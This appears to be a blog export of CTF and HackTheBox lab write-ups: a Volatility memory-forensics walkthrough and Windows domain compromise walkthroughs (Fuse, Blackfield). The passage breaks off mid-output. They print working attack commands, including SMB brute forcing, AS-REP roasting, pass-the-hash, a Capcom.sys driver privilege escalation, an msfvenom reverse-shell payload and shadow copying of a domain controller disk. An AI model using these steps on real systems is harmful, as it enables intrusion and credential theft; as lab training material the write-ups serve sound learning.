0xfffffa8005a80060:wscript.exe 5116 3952 8 312 2019-03-22 05:35:32 UTC+0000... 0xfffffa8005a1d9e0:UWkpjFjDzM.exe 3496 5116 5 109 2019-03-22 05:35:33 UTC+0000.... 0xfffffa8005bb0060:cmd.exe 4660 3496 1 33 2019-03-22 05:35:36 UTC+0000. 0xfffffa80054f9060:notepad.exe 3032 1432 1 60 2019-03-22 05:32:22 UTC+000 and we got the answer UWkpjFjDzM.exe Question 5:What was the IP address of the machine at the time the RAM dump was created?Flag Format-flag&lt;xyz&gt;Everything after the – is what you need to submit, your answer is the xyx. Solution:We have to find the ip address, using the plugin netscan kali Desktop/forensic_images » volatility -f memory.mem --profile=Win7SP1x64 netscan | grep -v &#x27;127.0.0.1\\|0.0.0.0&#x27; Use grep to filter localhost ip address. The owner of system process svchost.exe seems bind to ip address 10.0.0.101:55736 which is the IP address when the RAM dump is created Question 6Based on the answer regarding to the infected PID, can you determine what the IP of the attacker was?Flag Format-flag&lt;xyz&gt;Everything after the – is what you need to submit, your answer is the xyx. SolutionGoing back to question 4 we found out the malicious process is UWkpjFjDzM.exe Still using the same netscan plugin,we find out there’s a connection to 10.0.0.106 port 4444 is one of the favorite port for malicious connection from hacker kali Desktop/forensic_images » volatility -f memory.mem --profile=Win7SP1x64 netscan | grep UWkpjFjDzM.exe Volatility Foundation Volatility Framework 2.60x13e397190 TCPv4 10.0.0.101:49217 10.0.0.106:4444 ESTABLISHED 3496 UWkpjFjDzM.exe So the malicious hacker ip is 10.0.0.106 Question 7What process name is VCRUNTIME140.dll associated with?Flag Format-flag&lt;xyz&gt;Everything after the – is what you need to submit, your answer is the xyx. SolutionWe have to use the dlllist plugin kali Desktop/forensic_images » volatility -f memory.mem --profile=Win7SP1x64 dlllist &gt; dlllist We find the keyword dll VCRUNTIME140.dll we found the malicious software OfficeClickToRun.exe However beware that the process name should be OfficeClickToR Question 8What is the md5 hash value the potential malware on the system?Flag Format-flag&lt;xyz&gt;Everything after the – is what you need to submit, your answer is the xyx. Solution :We are not able to identify the hash directly in memory dump. We have to use one of the volatility function Procdump At first I though the malicious process is OfficeClickToR but it appears to be UWkpjFjDzM.exe we found earlier one kali Desktop/forensic_images » volatility -f memory.mem --profile=Win7SP1x64 procdump -p 3496 --dump-dir .Volatility Foundation Volatility Framework 2.6Process(V) ImageBase Name Result------------------ ------------------ -------------------- ------0xfffffa8005a1d9e0 0x0000000000400000 UWkpjFjDzM.exe OK: executable.3496.exe kali Desktop/forensic_images » md5sum executable.3496.exe 690ea20bc3bdfb328e23005d9a80c290 executable.3496.exe and we got the md5 hash Question 9What is the LM hash of bobs account?Flag Format-flag&lt;xyz&gt;Everything after the – is what you need to submit, your answer is the xyx. Solution :Use the hashdump plugin kali Desktop/forensic_images » volatility -f memory.mem --profile=Win7SP1x64 hashdump Volatility Foundation Volatility Framework 2.6Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::Bob:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: and we got bob’s hash Question 10What protections does the VAD node at 0xfffffa800577ba10 have?Flag Format-flag&lt;xyz&gt;Everything after the – is what you need to submit, your answer is the xyx. Solutionsimple kali Desktop/forensic_images » volatility -f memory.mem --profile=Win7SP1x64 vadinfo | grep -A 5 &#x27;0xfffffa800577ba10&#x27; 130 ↵Volatility Foundation Volatility Framework 2.6VAD node @ 0xfffffa800577ba10 Start 0x0000000000030000 End 0x0000000000033fff Tag Vad Flags: NoChange: 1, Protection: 1Protection: PAGE_READONLYVad Type: VadNoneControlArea @fffffa8005687a50 Segment fffff8a000c4f870NumberOfSectionReferences: 1 NumberOfPfnReferences: 0 The answer is PAGE_READONLY Question 11There was a VBS script run on the machine. What is the name of the script? (submit without file extension)Flag Format-flag&lt;xyz&gt;Everything after the – is what you need to submit, your answer is the xyx. Solution:After some research find out that, wscript.exe is tasked with executing the VBScript files. [What is wscript.exe?]([https://www.file.net/process/wscript.exe.html#:~:text=The%20genuine%20wscript.exe%20file,any%20harm%20to%20your%20PC.](https://www.file.net/process/wscript.exe.html#:~:text=The genuine wscript.exe file,any harm to your PC.)) Hence, we can perform a memory dump on wscript.exe and use strings to identify which VBScripts file has been executed kali Desktop/forensic_images » volatility -f memory.mem --profile=Win7SP1x64 memdump -p 5116 --dump-dir . 2 ↵Volatility Foundation Volatility Framework 2.6************************************************************************Writing wscript.exe [ 5116] to 5116.dmpkali Desktop/forensic_images » strings 5116.dmp| grep vbs &quot;C:\\Windows\\System32\\wscript.exe&quot; //B //NOLOGO %TEMP%\\vhjReUDEuumrX.vbs%TEMP%\\vhjReUDEuumrX.vbs%TEMP%\\vhjReUDEuumrX.vbsvbscript.dllvbscript.pdbvbscript.vbs.vbsx86_microsoft-windows-m..ents-mdac-ado15-vbs_31bf3856ad364e35_none_9360988f60461a77amd64_microsoft-windows-m..ents-mdac-oledb-vbs_31bf3856ad364e35_none_444030db0904e80bamd64_microsoft-windows-m..nts-mdac-rds-ce-vbs_31bf3856ad364e35_none_17691405728212bfamd64_microsoft-windows-scripting-vbscript_31bf3856ad364e35_none_1dd485790300b91fnx86_microsoft-windows-m..ents-mdac-oledb-vbs_31bf3856ad364e35_none_e821955750a776d5x86_microsoft-windows-m..nts-mdac-rds-ce-vbs_31bf3856ad364e35_none_bb4a7881ba24a189wow64_microsoft-windows-scripting-vbscript_31bf3856ad364e35_none_28292fcb37617b1aamd64_microsoft-windows-m..ents-mdac-ado15-vbs_31bf3856ad364e35_none_ef7f341318a38badvbscript.vbs.vbsx86_microsoft-windows-s..-vbscript.resources_31bf3856ad364e35_en-us_fc14ed9ab50fcbf0amd64_microsoft-windows-s..-vbscript.resources_31bf3856ad364e35_en-us_5833891e6d6d3d26version:1|.ade:3|.adp:3|.app:3|.asp:3|.bas:3|.bat:3|.bz:3|.bz2:3|.cer:3|.chm:3|.class:3|.cmd:3|.com:3|.command:3|.cpl:3|.crt:3|.csh:3|.desktop:3|.exe:3|.fxp:3|.gz:3|.hex:3|.hlp:3|.hqx:3|.hta:3|.inf:3|.ini:3|.ins:3|.isp:3|.its:3|.job:3|.js:3|.jse:3|.ksh:3|.lnk:3|.lzh:3|.mad:3|.maf:3|.mag:3|.mam:3|.maq:3|.mar:3|.mas:3|.mat:3|.mau:3|.mav:3|.maw:3|.mda:3|.mde:3|.mdt:3|.mdw:3|.mdz:3|.msc:3|.msi:3|.msp:3|.mst:3|.ocx:3|.ops:3|.pcd:3|.pi:3|.pif:3|.prf:3|.prg:3|.pst:3|.rar:3|.reg:3|.scf:3|.scr:3|.sct:3|.sea:3|.shb:3|.shs:3|.sit:3|.tar:3|.tgz:3|.tmp:3|.url:3|.vb:3|.vbe:3|.vbs:3|.vsmacros:3|.vss:3|.vst:3|.vsw:3|.webloc:3|.ws:3|.wsc:3|.wsf:3|.wsh:3|.zip:3|.zlo:3|.zoo:3|.pdf:2|.fdf:2version:1|shell:3|hcp:3|ms-help:3|ms-its:3|ms-itss:3|its:3|mk:3|mhtml:3|help:3|disk:3|afp:3|disks:3|telnet:3|ssh:3|javascript:1|vbscript:1|acrobat:2|mailto:2|file:2eventvwr.exegatherNetworkInfo.vbsslmgr.vbswinrm.vbsamd64_microsoft-windows-m..ents-mdac-oledb-vbs_31bf3856ad364e35_none_444030db0904e80b.vbsamd64_microsoft-windows-s..-vbscript.resources_31bf3856ad364e35_en-us_5833891e6d6d3d26x86_microsoft-windows-s..-vbscript.resources_31bf3856ad364e35_en-us_fc14ed9ab50fcbf0 The answer is vhjReUDEuumrX.vbs Question 12An application was run at 2019-03-07 23:06:58 UTC, what is the name of the program? (Include extension)Flag Format-flag&lt;xyz&gt;Everything after the – is what you need to submit, your answer is the xyx. SolutionI have no clue at first, but manage to find the plugin shimache which indicates the timestamp Caching Out: The Value of Shimcache for Investigators kali Desktop/forensic_images » volatility -f memory.mem --profile=Win7SP1x64 shimcache | grep &#x27;2019-03-07 23:06:58&#x27;Volatility Foundation Volatility Framework 2.62019-03-07 23:06:58 UTC+0000 \\??\\C:\\Program Files (x86)\\Microsoft\\Skype for Desktop\\Skype.exe We find out The skype application is running Question 13What was written in notepad.exe in the time of the memory dump?Flag Format-flag&lt;xyz&gt;Everything after the – is what you need to submit, your answer is the xyx. Solutionkali Desktop/forensic_images » volatility -f memory.mem --profile=Win7SP1x64 memdump -p 3032 --dump-dir .kali Desktop/forensic_images » strings -e l 3032.dmp | grep &quot;flag&lt;&quot;flag&lt;REDBULL_IS_LIFE&gt;flag&lt;Th&gt;flag&lt;Th&gt;flag&lt;TheK&gt;flag&lt;TheK&gt; The solution is straight forward, get the notepad memory dump and grep for the flag Question 14What is the shortname of the file at file record 59045?Flag Format-flag&lt;xyz&gt;Everything after the – is what you need to submit, your answer is the xyx.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://ik0nw.github.io/categories/CTF/"}],"tags":[{"name":"forensic","slug":"forensic","permalink":"https://ik0nw.github.io/tags/forensic/"}],"author":"Ikonw"},{"title":"HTB::Challenge [Misc] G0ld","slug":"Challenge-G0ld","date":"2020-08-14T22:29:33.000Z","updated":"2020-09-20T06:50:00.784Z","comments":true,"path":"2020/08/15/Challenge-G0ld/","permalink":"https://ik0nw.github.io/2020/08/15/Challenge-G0ld/","excerpt":"","text":"After extracted the file The pdf file is password protected. Search for pdf2john and we created the hash for john to cracked it. By using the rockyou dictionary, we are able to get the password john --wordlist=&lt;rockyou.txt&gt; &lt;pdf_hash&gt; we got the password jumanji69 after open the pdf, found morse code copy it and decode online we got the flag","categories":[{"name":"hackthebox-challenge","slug":"hackthebox-challenge","permalink":"https://ik0nw.github.io/categories/hackthebox-challenge/"},{"name":"misc","slug":"hackthebox-challenge/misc","permalink":"https://ik0nw.github.io/categories/hackthebox-challenge/misc/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"}]},{"title":"HTB Fuse Writeup","slug":"HTB-Fuse","date":"2020-06-15T00:00:00.000Z","updated":"2020-11-07T07:54:21.015Z","comments":true,"path":"2020/06/15/HTB-Fuse/","permalink":"https://ik0nw.github.io/2020/06/15/HTB-Fuse/","excerpt":"","text":"Author Ikonwnmap# Nmap 7.80 scan initiated Wed Sep 2 03:57:19 2020 as: nmap -Pn -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49667,49675,49676,49680,49698 -oN nmap/Full_10.10.10.193.nmap 10.10.10.193Nmap scan report for 10.10.10.193Host is up (0.0079s latency).PORT STATE SERVICE VERSION53/tcp open domain?| fingerprint-strings: | DNSVersionBindReqTCP: | version|_ bind80/tcp open http Microsoft IIS httpd 10.0| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Site doesn&#x27;t have a title (text/html).88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-09-02 08:10:26Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: FABRICORP)464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: fabricorp.local, Site: Default-First-Site-Name)3269/tcp open tcpwrapped5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp open mc-nmf .NET Message Framing49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49675/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049676/tcp open msrpc Microsoft Windows RPC49680/tcp open msrpc Microsoft Windows RPC49698/tcp open msrpc Microsoft Windows RPC1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port53-TCP:V=7.80%I=7%D=9/2%Time=5F4F506B%P=x86_64-pc-linux-gnu%r(DNSVeSF:rsionBindReqTCP,20,&quot;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\xSF:04bind\\0\\0\\x10\\0\\x03&quot;);Service Info: Host: FUSE; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 2h33m00s, deviation: 4h02m32s, median: 12m58s| smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)| Computer name: Fuse| NetBIOS computer name: FUSE\\x00| Domain name: fabricorp.local| Forest name: fabricorp.local| FQDN: Fuse.fabricorp.local|_ System time: 2020-09-02T01:12:45-07:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: required| smb2-security-mode: | 2.02: |_ Message signing enabled and required| smb2-time: | date: 2020-09-02T08:12:42|_ start_date: 2020-09-02T08:04:25Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Wed Sep 2 04:01:52 2020 -- 1 IP address (1 host up) scanned in 273.40 seconds We get the FQDN from the smb-os-discovery script add it to the &#x2F;etc&#x2F;hosts I like to enumerate smb ports first ┌──(root💀kali)-[~]└─# enum4linux Fuse.fabricorp.localStarting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Sep 7 11:02:19 2020 However it didnt give me any critical information, anonymous login didnt get me anything too ┌──(root💀kali)-[~]└─# smbclient -L 10.10.10.193 Enter WORKGROUP\\root&#x27;s password: Anonymous login successful Sharename Type Comment --------- ---- -------SMB1 disabled -- no workgroup available Start investigate the web, it’s a papercut CMS if im not wrong. Found some user in each print logs We collect all the user pmertontlavelsthompsonbhultadministrator According to previous box such as sauna. The entry point most likely is to collect user and password from the web server and brute force on smb ports. Therefore we use cewl to make a collection of password dictionary. cewl -w wordlist http://fuse.fabricorp.local/papercut/logs/html/index.htm -m3 --with-numbers Launch msfconsole use the smb_login module to bruteforce msf5 auxiliary(scanner/smb/smb_login) &gt; set USER_FILE userUSER_FILE =&gt; usermsf5 auxiliary(scanner/smb/smb_login) &gt; set PASS_FILE wordlistPASS_FILE =&gt; wordlistmsf5 auxiliary(scanner/smb/smb_login) &gt; set rhosts 10.10.10.193rhosts =&gt; 10.10.10.193msf5 auxiliary(scanner/smb/smb_login) &gt; set smbdomain fabricorp.localsmbdomain =&gt; fabricorp.localmsf5 auxiliary(scanner/smb/smb_login) &gt; run successfully got 2 creds [+] 10.10.10.193:445 - 10.10.10.193:445 - Success: &#x27;fabricorp.local\\tlavel:Fabricorp01&#x27;[+] 10.10.10.193:445 - 10.10.10.193:445 - Success: &#x27;fabricorp.local\\bhult:Fabricorp01&#x27; Trying login to smb server, but was prompt with error which I never meet. Both account have the same problem ┌──(root💀kali)-[~/Desktop/hackthebox/Windows/fuse]└─# smbclient -L 10.10.10.193 -U tlavel Enter WORKGROUP\\tlavel&#x27;s password: session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE ┌──(root💀kali)-[~/Desktop/hackthebox/Windows/fuse]└─# smbclient -L 10.10.10.193 -U bhult Enter WORKGROUP\\bhult&#x27;s password: session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE After some google,find out I can use smbpasswd to change the password There seems some password policy, so I change the password to Fabricop011 for both accout ┌──(root💀kali)-[~/Desktop/hackthebox/Windows/fuse]└─# smbpasswd -r 10.10.10.193 -U tlavel Old SMB password:New SMB password:Retype new SMB password:Password changed for user tlavel on 10.10.10.193. After some enumeration on rpcclient and password $fab@s3Rv1ce$1 found some username rpcclient $&gt; enumdomusersuser:[Administrator] rid:[0x1f4]user:[Guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[DefaultAccount] rid:[0x1f7]user:[svc-print] rid:[0x450]user:[bnielson] rid:[0x451]user:[sthompson] rid:[0x641]user:[tlavel] rid:[0x642]user:[pmerton] rid:[0x643]user:[svc-scan] rid:[0x645]user:[bhult] rid:[0x1bbd]user:[dandrews] rid:[0x1bbe]user:[mberbatov] rid:[0x1db1]user:[astein] rid:[0x1db2]user:[dmuir] rid:[0x1db3] and one password rpcclient $&gt; enumprinters flags:[0x800000] name:[\\\\10.10.10.193\\HP-MFT01] description:[\\\\10.10.10.193\\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)] comment:[] and we try to login to windows using this credentials. Went back to to msfconsole, we lanuch win_rm module to brute force the username against the password and we got the creds svc-print:$fab@s3Rv1ce$1 use evil-winrm to login ┌──(root💀kali)-[/opt/evil-winrm]└─# ./evil-winrm.rb -i 10.10.10.193 -u svc-print -p \\$fab@s3Rv1ce\\$1 1 ⨯Evil-WinRM shell v2.3Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\svc-print\\Documents&gt; dir*Evil-WinRM* PS C:\\Users\\svc-print\\Documents&gt; cd ..*Evil-WinRM* PS C:\\Users\\svc-print&gt; dir Directory: C:\\Users\\svc-printMode LastWriteTime Length Name---- ------------- ------ ----d-r--- 6/1/2020 1:45 AM Desktopd-r--- 5/31/2020 5:20 PM Documentsd-r--- 7/16/2016 6:18 AM Downloadsd-r--- 7/16/2016 6:18 AM Favoritesd-r--- 7/16/2016 6:18 AM Linksd-r--- 7/16/2016 6:18 AM Musicd-r--- 7/16/2016 6:18 AM Picturesd----- 7/16/2016 6:18 AM Saved Gamesd-r--- 7/16/2016 6:18 AM Videos*Evil-WinRM* PS C:\\Users\\svc-print&gt; cd Desktop*Evil-WinRM* PS C:\\Users\\svc-print\\Desktop&gt; dir Directory: C:\\Users\\svc-print\\DesktopMode LastWriteTime Length Name---- ------------- ------ -----ar--- 9/7/2020 12:35 AM 34 user.txt RootAfter getting root, check user’s privilege PRIVILEGES INFORMATION----------------------Privilege Name Description State============================= ============================== =======SeMachineAccountPrivilege Add workstations to domain EnabledSeLoadDriverPrivilege Load and unload device drivers EnabledSeShutdownPrivilege Shut down the system EnabledSeChangeNotifyPrivilege Bypass traverse checking EnabledSeIncreaseWorkingSetPrivilege Increase a process working set Enabled seLoadDrivePrivilege is enabled Abusing SeLoadDriverPrivilege for privilege escalation This site is a good reference for SeLoadDriverPrivilege escalation EopLoaddriver Capcom.sys ExploitCapcom open up the ExploitCapcom.cpp file, modify the Launch shell function. Change the commandLine[] targeted to a meterpreter.exe and compile it. Next we have to generate a meterpreter.exe msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.10.10 lport=1234 -f exe &gt; meterpreter.exe Create a folder called temp in C:\\ and upload all the 4 files to the target server. *Evil-WinRM* PS C:\\temp&gt; .\\EOPLOADDRIVER.exe System\\CurrentControlSet\\MyService C:\\temp\\capcom.sys[+] Enabling SeLoadDriverPrivilege[+] SeLoadDriverPrivilege Enabled[+] Loading Driver: \\Registry\\User\\S-1-5-21-2633719317-1471316042-3957863514-1104\\System\\CurrentControlSet\\MyServiceNTSTATUS: c000010e, WinError: 0*Evil-WinRM* PS C:\\temp&gt; .\\ExploitCapcom.exe[*] Capcom.sys exploit[*] Capcom.sys handle was obtained as 0000000000000080[*] Shellcode was placed at 000002841CC20008[+] Shellcode was executed[+] Token stealing was successful[+] The SYSTEM shell was launched[*] Press any key to exit this program And we got the meterpreter session on our multi handler","categories":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/categories/hackthebox/"}],"tags":[{"name":"hackthebox","slug":"hackthebox","permalink":"https://ik0nw.github.io/tags/hackthebox/"},{"name":"medium","slug":"medium","permalink":"https://ik0nw.github.io/tags/medium/"}]},{"title":"HTB BlackField Writeup","slug":"HTB-BlackField","date":"2020-06-10T00:00:00.000Z","updated":"2020-10-08T23:04:31.573Z","comments":true,"path":"2020/06/10/HTB-BlackField/","permalink":"https://ik0nw.github.io/2020/06/10/HTB-BlackField/","excerpt":"","text":"Author: IkonwNmap Scan:Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-07 20:09 +08Nmap scan report for 10.10.10.192Host is up (0.0074s latency).PORT STATE SERVICE VERSION88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-09-07 19:09:38Z)135/tcp open msrpc Microsoft Windows RPC139/tcp filtered netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.03268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not FoundService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: 6h59m59s| smb2-security-mode: | 2.02: |_ Message signing enabled and required| smb2-time: | date: 2020-09-07T19:09:47|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 51.59 seconds Launch smbmap login using anonymous account, found 2 files we can read ┌──(root💀kali)-[/opt/nmapAutomator]└─# smbmap -H 10.10.10.192 -u anonymous 2 ⨯[+] Guest session IP: 10.10.10.192:445 Name: 10.10.10.192 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share forensic NO ACCESS Forensic / Audit share. IPC$ READ ONLY Remote IPC NETLOGON NO ACCESS Logon server share profiles$ READ ONLY SYSVOL NO ACCESS Logon server share Access to profiles$ We found tons of user name, use along with awk command we collect the usernames smbclient \\\\\\\\10.10.10.192\\\\profiles$ -c ls | awk &#x27;&#123;print $1&#125;&#x27; &gt; user.lst Launch the impacket tool GetNPUsers.py ┌──(root💀kali)-[~/Desktop/hackthebox/Windows/blackfield]└─# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py BLACKFIELD.local/ -no-pass -usersfile user.lst | grep -v &quot;not found&quot;Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation[-] User audit2020 doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$23$support@BLACKFIELD.LOCAL:d3f58a3eb5d36dc74f2c4a4335a5ce3e$06ce4ccf78e620d6e2e9994bd546f519cabec98dd1879365456bcee2081d7f0579d8e6b20d7b0e5750c533de72b48404ad38bf2241acc01cdf9e1868717cb01142ab131ebda7de2a0916a141ba5b1fd1b8e0895833ea57ce4b01cd93900eba7c4bab1e1a8dfcdb471486fedc1f731b5e65f38219e37883274350288d916e18f43359a170dd9aa3ef22d53c399378ed3467467211d6be448ee73983abe6cf7998725bfa70b7de45969715c15417af5249ebe9dd16332222f17101bbb1bdbfc2d32ac2bc319302911973a88a2b67fd425092e0f31329d04fd9eca106a97f2265185f6ae6c8ca8e747272dcad410bfbedac0275ed12[-] User svc_backup doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] invalid principal syntax Save the hash and use john to crack it. We got the creds support:#00^BlackKnight ┌──(root💀kali)-[~/Desktop/hackthebox/Windows/blackfield]└─# john --wordlist=/usr/share/wordlists/rockyou.txt user_hashUsing default input encoding: UTF-8Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])Will run 4 OpenMP threadsPress &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status#00^BlackKnight ($krb5asrep$23$support@BLACKFIELD.LOCAL)1g 0:00:00:16 DONE (2020-09-07 21:30) 0.06203g/s 889266p/s 889266c/s 889266C/s #1ByNature..#*burberry#*1990Use the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed Try login using winrm port, but it failed. Let’s go back to use new credentials to smb server ┌──(root💀kali)-[~/Desktop/hackthebox/Windows/blackfield]└─# smbmap -H 10.10.10.192 -u support -p &quot;#00^BlackKnight&quot; 2 ⨯[+] IP: 10.10.10.192:445 Name: BLACKFIELD.local Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share forensic NO ACCESS Forensic / Audit share. IPC$ READ ONLY Remote IPC NETLOGON READ ONLY Logon server share profiles$ READ ONLY SYSVOL READ ONLY Logon server share Found nothing interesting use rpcclient connect to rpc rpcclient -U blackfield.local\\\\support 10.10.10.192rpcclient $&gt; enumdomusersuser:[Administrator] rid:[0x1f4]user:[Guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[audit2020] rid:[0x44f]user:[support] rid:[0x450]user:[BLACKFIELD764430] rid:[0x451]user:[BLACKFIELD538365] rid:[0x452]user:[BLACKFIELD189208] rid:[0x453]user:[BLACKFIELD404458] rid:[0x454]user:[BLACKFIELD706381] rid:[0x455]user:[BLACKFIELD937395] rid:[0x456]........................... We got tons of user again. After research, nothing special. But came along with a article using rpc to reset domain user password Reset AD User password with Linux Make a change to user audit2020 password to Ikonw123! rpcclient $&gt; setuserinfo2Usage: setuserinfo2 username level password [password_expired]result was NT_STATUS_INVALID_PARAMETERrpcclient $&gt; setuserinfo2 audit2020 23 Ikonw123! Sadly, we still not able login using winrm but we can access audit2020‘s smb share again. yeah smb share againnnn. This time round, forensic folder is available to us ┌──(root💀kali)-[/opt/nmapAutomator/10.10.10.192/nmap]└─# smbmap -H 10.10.10.192 -u audit2020 -p Ikonw123![+] IP: 10.10.10.192:445 Name: BLACKFIELD.local Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share forensic READ ONLY Forensic / Audit share. IPC$ READ ONLY Remote IPC NETLOGON READ ONLY Logon server share profiles$ READ ONLY SYSVOL READ ONLY Logon server share ┌──(root💀kali)-[/opt/nmapAutomator/10.10.10.192/nmap]└─# smbclient \\\\\\\\10.10.10.192\\\\forensic -U audit2020 Enter WORKGROUP\\audit2020&#x27;s password: Try &quot;help&quot; to get a list of possible commands.smb: \\&gt; ls . D 0 Sun Feb 23 21:03:16 2020 .. D 0 Sun Feb 23 21:03:16 2020 commands_output D 0 Mon Feb 24 02:14:37 2020 memory_analysis D 0 Fri May 29 04:28:33 2020 tools D 0 Sun Feb 23 21:39:08 2020 7846143 blocks of size 4096. 3978511 blocks availablesmb: \\&gt; Alright, it seems tons of files. Download the folder to local (If your internet connection is slow, you might also consider just mount the smb directory to local) recurse ONprompt OFFmget * A DMP file is a file that contains data “dumped” from a program’s memory space. It is often created when a program has an error or crashes and may also be saved by the program “Savedump.exe” on the first reboot after a crash. DMP files are usually named “Memory.dmp.” pypykatz has the ability to parse the secrets hidden in the LSASS process, it is just something like mimikatz’s sekurlsa:: pypykatz lsa minidump lsass.DMP and we actually got the password hash for user svc_backup == MSV == Username: svc_backup Domain: BLACKFIELD LM: NA NT: 9658d1d1dcd9250115e2205d9f48400d SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c No need to bruteforce, we can directly pass the hash using evil-winrm ──(root💀kali)-[/opt/nmapAutomator/10.10.10.192/nmap/memory_analysis]└─# evil-winrm.rb -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192 Privilege escalationAfter checking the user’s privileges, found out that SeBackupPrivilege is enabled. SeBackupPrivilegeDescription: This privilege causes the system to grant all read access control to any file, regardless of the access control list (ACL) specified for the file. Firstly, I tried the vssadmin, well I don’t have the privilege *Evil-WinRM* PS C:\\Users&gt; vssadmin create shadow /for=C:vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool(C) Copyright 2001-2013 Microsoft Corp.Error: You don&#x27;t have the correct permissions to run this command. Please run this utility from a commandwindow that has elevated administrator privileges. Members of “Backup Operators” can logon locally on a Domain Controller and backup the NTDS.DIT, for ex. with: “wbadmin.exe” or “diskshadow.exe As I read carefully, found out that diskshadow allow us to create a new shadow disk copy of the disk C and expose it as another driver shadow_copy.txt set context persistent nowritersadd volume c: alias ikonwcreateexpose %ikonw% z: However it has error -&gt; set context persistent nowriter &lt;&lt;--- shudnt it be nowriters?SET CONTEXT &#123; CLIENTACCESSIBLE | PERSISTENT [ NOWRITERS ] | VOLATILE [ NOWRITERS ] &#125; CLIENTACCESSIBLE Specify to create shadow copies usable by client versions of Windows. PERSISTENT Specify that shadow copy is persist across program exit, reset or reboot. PERSISTENT NOWRITERS Specify that shadow copy is persistent and all writers are excluded. VOLATILE Specify that shadow copy will be deleted on exit or reset. VOLATILE NOWRITERS Specify that shadow copy is volatile and all writers are excluded. Example: SET CONTEXT CLIENTACCESSIBLE Add extra character behind set context persistent nowriterssadd volume c: alias ikonwwcreateeexpose %ikonw% z:: However one more error!! The .cab metadata file cannot be stored in the current working directory, because it is read-only. ermmm, maybe I am in the document directory create a temp folder at C:\\temp Finally, we successfully create the shadow disk at Z: drive *Evil-WinRM* PS C:\\temp&gt; diskshadow /s shadow_copy.txtMicrosoft DiskShadow version 1.0Copyright (C) 2013 Microsoft CorporationOn computer: DC01, 9/8/2020 5:40:45 AM-&gt; set context persistent nowriters-&gt; add volume c: alias ikonw-&gt; createAlias ikonw for shadow ID &#123;f3ecf98c-d3cb-4ffe-8dc8-b613d3ab5922&#125; set as environment variable.Alias VSS_SHADOW_SET for shadow set ID &#123;115480f7-6f83-46ee-8ea6-4fcf8bcb1d81&#125; set as environment variable.Querying all shadow copies with the shadow copy set ID &#123;115480f7-6f83-46ee-8ea6-4fcf8bcb1d81&#125; * Shadow copy ID = &#123;f3ecf98c-d3cb-4ffe-8dc8-b613d3ab5922&#125; %ikonw% - Shadow copy 